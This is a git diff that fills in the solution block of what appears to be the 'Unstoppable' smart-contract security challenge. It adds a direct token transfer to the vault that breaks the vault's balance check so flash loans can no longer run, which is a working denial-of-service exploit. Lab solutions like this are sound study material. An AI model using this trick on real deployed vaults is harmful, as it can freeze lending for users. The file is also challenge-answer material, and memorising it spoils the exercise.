@@ -45,6 +45,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // it alters the balance of the vault, so that the flash loan is not possible anymore
+        await token.connect(player).transfer(vault.address, 5n * 10n ** 18n);
+
     });
 
     after(async function () {
